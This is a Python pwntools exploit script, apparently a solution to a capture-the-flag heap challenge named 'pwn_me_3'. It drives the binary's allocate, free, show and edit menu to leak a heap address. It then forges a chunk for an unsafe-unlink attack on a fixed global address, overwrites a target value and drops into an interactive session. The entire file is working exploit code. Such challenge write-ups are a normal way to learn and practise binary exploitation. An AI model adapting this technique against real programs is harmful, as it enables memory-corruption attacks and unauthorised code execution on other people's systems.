from pwn import*
context.log_level = 'debug'
def add(size,content):
	p.sendlineafter('5,exit','1')
	p.sendlineafter('size',str(size))
	p.sendafter('content',content)
def free(index):
	p.sendlineafter('5,exit','2')
	p.sendlineafter('idx',str(index))
def show(index):
	p.sendlineafter('5,exit','3')
	p.sendlineafter('idx',str(index))
def edit(index,content):
	p.sendlineafter('5,exit','4')
	p.sendlineafter('idx',str(index))
	p.send(content)

p = process('./pwn_me_3')
p.recvuntil('are you ready?')
add(0x20,'S') #0
add(0x20,'S') #1
add(0x88,'M')  #2
add(0xF0,'M')  #3

free(0)
free(1)
add(0x20,'S') #0
show(0)
p.recvline()
Goal = u64(p.recv(3).ljust(8,'\x00')) - ord('S') + 0x10
log.success('Goal_Addr:\t' + hex(Goal))

free(2)
Fake = 0x6020E8
payload = p64(0)
payload += p64(0x81)
payload += p64(Fake-0x18)
payload += p64(Fake-0x10)
payload = payload.ljust(0x80,'\x00')
payload += p64(0x80)
add(0x88,payload)
free(3)
edit(1,p64(0)*2 + p64(Goal) + '\n')
edit(0,p64(0x66666666))
p.sendline('5')
p.interactive()
